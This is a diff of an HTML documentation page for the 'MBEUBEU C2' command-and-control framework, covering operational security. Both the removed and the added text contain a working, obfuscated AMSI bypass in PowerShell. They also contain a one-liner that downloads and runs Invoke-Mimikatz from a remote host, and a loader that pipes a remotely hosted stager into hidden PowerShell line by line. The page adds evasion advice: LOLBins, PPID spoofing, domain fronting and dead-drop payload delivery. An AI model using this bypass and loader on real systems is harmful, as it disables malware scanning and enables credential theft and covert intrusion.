@@ -188,91 +188,70 @@
   </nav>
 
   <main class="content">
-    <div class="logo-container">
-                <img src="images/mbeubeu.png" alt="MBEUBEU C2 " class="c2-logo">
-    </div>
+  <div class="logo-container">
+    <img src="images/mbeubeu.png" alt="MBEUBEU C2" class="c2-logo">
+  </div>
 
+  <h2 class="glow-title">OPSEC</h2>
 
-    <h2 class="glow-title">OPSEC</h2>
-    <h3 style="color: red;">Perfect OPSEC doesnot exist, a <code>whoami</code> at the Wrong Time is a Beacon. Every single action during an operation has a detection risk. Its just a matter of how loud it is, when you do it, and how you cover your tracks <br>
-	    Even a simple whoami can trigger alerts in some hardened environments if it’s done by a process not in the allowlist or during odd hours<br>Note that when the wrong hands (no IT member) type <code>ipconfig</code>, the blue team starts hunting. Your access becomes your disguise, and your commands must reflect the role of the user you compromised. </h3><br> 
-    <p>
-	The technique used to bypass AMSI in pwsploit and pwsh-execute here is simple but effective.<br><br>
+  <h3 style="color: red;">
+    Perfect OPSEC does not exist. A <code>whoami</code> at the wrong time is a beacon.
+    Every action during an operation has a detection risk—it’s just a matter of how loud it is,
+    when you do it, and how you cover your tracks.<br><br>
+    Even a simple <code>whoami</code> can trigger alerts in hardened environments if it's executed
+    by a non-allowlisted process or at odd hours. Once you compromise a user, your access becomes
+    your disguise. Your commands must reflect the role of the compromised user.<br>
+    When someone outside IT runs <code>ipconfig</code>, the hunt starts. 👀
+  </h3><br>
 
-	As many of you know, using Matt Graeber’s well-known AMSI bypass method via reflection  
-	(e.g., <code>[Ref].Assembly.GetType(...).GetField(...).SetValue(...)</code>) is usually detected and blocked  
-	by modern AMSI signatures if executed as a single line.<br><br>
+  <p>
+    The AMSI bypass technique used in tools like `pwsploit` and `pwsh-execute` is simple yet powerful.<br><br>
 
-	However, years ago I came across a clever trick (I don’t recall the original source),  
-	and I’ve been using it successfully ever since.<br><br>
+    Traditional bypasses using Matt Graeber’s method (e.g., <code>[Ref].Assembly.GetType(...)</code>) are often detected by AMSI if executed on a single line.<br><br>
 
-	The idea is this: instead of running the AMSI bypass in one line, split it into multiple lines  
-	and run them one at a time <em>in the same PowerShell process</em>. This delays AMSI scanning until after  
-	the bypass has taken effect.<br><br>
+    However, by splitting the bypass into multiple lines and executing each line in the **same** PowerShell process,
+    AMSI scanning is delayed until after the bypass takes effect.<br><br>
+  </p>
 
-	<strong>== PoC ==</strong><br><br>
+  <strong>== PoC ==</strong><br><br>
+  <div class="logo-container">
+    <img src="screenshots/opsec.png" alt="opsec AMSI bypass PoC" class="screenshot">
+  </div><br><br>
 
+  <strong>== Real-World Example ==</strong><br><br>
+  <p>
+    Suppose your stager is hosted at:
+    <code>https://us.hospital.org/patients</code><br><br>
 
-	<div class="logo-container">
-                <img src="screenshots/opsec.png" alt="MBEUBEU C2 " class="screenshot">
-        </div>
+    Your remote script could include:
+    <pre>
+$a = [Ref].Assembly.GetType('Sys'+'tem.Manag'+'ement.Au'+'tomation.Am'+'siUtils')
+$b = $a.GetField('ams'+'iInitF'+'ailed','NonP'+'ublic,St'+'atic')
+$b.SetValue($null,$true)
+iex (New-Object Net.WebClient).DownloadString('http://example.com/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command "privilege::debug"
+    </pre>
 
+    Then load it line-by-line using:
+    <pre>
+$file = (New-Object System.Net.WebClient).DownloadString('https://us.hospital.org/patients')
+foreach ($line in $file) {
+    $line | powershell -nop -w hidden
+}
+    </pre>
 
-	As you can see, breaking it into multiple lines makes the AMSI bypass effective.<br><br>
+    This delays AMSI enough to slip through.
+  </p>
 
-	<strong>== Real-World Example ==</strong><br><br>
-
-	Let’s say your PowerShell stager is hosted at:<br>
-	<code>https://us.hospital.org/patients</code><br><br>
-
-	You could prepend the AMSI bypass lines to the beginning of your remote script like this:<br><br>
-
-	<pre>
-	$a = [Ref].Assembly.GetType('Sys'+'tem.Manag'+'ement.Au'+'tomation.Am'+'siUtils')<br>
-	$b = $a.GetField('ams'+'iInitF'+'ailed','NonP'+'ublic,St'+'atic')<br>
-	$b.SetValue($null,$true)<br>
-	iex (New-Object Net.WebClient).DownloadString('http://example.com/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command "privilege::debug"
-	</pre><br><br>
-
-	Then, you can host a loader script at:<br><br>
-	<code>https://mayo-clinic.org/patient-centered-care</code><br><br>
-
-	This loader fetches and executes the above payload <strong>line by line</strong>:<br><br>
-
-	<pre>
-	$file = (New-Object System.Net.WebClient).DownloadString('https://us.hospital.org/patients')<br>
-	foreach ($line in $file) {<br>
-	&nbsp;&nbsp;&nbsp;&nbsp;$line | powershell -nop -w hidden<br>
-	}
-	</pre>
-
-	This technique works reliably to disable AMSI before malicious commands are scanned.<br><br>
-
-</p>
-
-
-
-    <h2>OPSEC Considerations</h2><br>
-    <ul>
-      <li><strong>execute-assembly</strong> is available, but <em>not OPSEC-safe</em> as it creates a new suspended process that can be detected. Instead, use <code>bof_execute</code> which is more silent and less likely to trigger detection. The <code>bof_execute</code> command is used to execute a beacon object file (.o file), which is highly stealthy.</li><br>
-      <li>All packages in <code>src</code> dir can be <strong>modified statically</strong> to avoid signature-based detection.</li><br>
-      <li>The <strong>Go-based stager</strong> can also be modified to implement AMSI bypass techniques or string obfuscation before being compiled.</li><br>
-      <li>Use randomized variable names and avoid common script structures or command sequences often detected by EDRs.</li><br>
-      <li>Strip comments and whitespace before delivery.</li><br>
-      <li>Use living-off-the-land binaries (LOLBins) where possible to load payloads (e.g., <code>msbuild</code>, <code>installutil</code>).</li><br>
-      <li>Prefer BOF + syscalls + PPID spoofing when possible for stealthy privilege escalation or process injection.</li><br>
-    </ul>
-
-    <p>Always test payloads in a monitored lab to verify stealth and detection evasion before deployment.</p>
-
-    <br><h2>SharpView Commands</h2><br>
-    <p>SharpView commands are available to gather information from the Windows environment, and can still be executed via <code>execute-assembly</code> or <code>bof_execute</code> commands. These commands offer powerful techniques for enumeration and lateral movement within a compromised environment</p>
-    
-
-    <p>These commands can be executed using the <code>bof_execute</code> command for beacon object files or <code>execute-assembly</code> for direct .NET assembly execution. Each offers distinct advantages in terms of stealth and persistence.</p>
-
-    <p>Next: <a href="development.html">Development / FaaS</a></p>
-  </main>
+  <h2>OPSEC Considerations</h2><br>
+  <ul>
+    <li><strong>execute-assembly</strong> is not OPSEC-safe—it spawns a new suspended process. Instead, prefer <code>bof_execute</code> which is more stealthy (uses Beacon Object Files).</li><br>
+    <li>Everything in the <code>src</code> folder can be statically modified to bypass signature-based detection engines.</li><br>
+    <li>The Go-based stager can embed AMSI bypasses and obfuscate strings before compilation.</li><br>
+    <li>Use domain fronting, legit CDN endpoints, and `dead drop resolvers` (e.g., pastebin, GitHub gists) for payload delivery.</li><br>
+    <li>Monitor your own beacons with anomaly detection logic (e.g., beaconing too often, using wrong user-agent).</li><br>
+    <li>Every command you type should mimic the role of your current session (Admin vs Helpdesk vs Intern).</li>
+  </ul>
+</main>
 </body>
 </html>
 
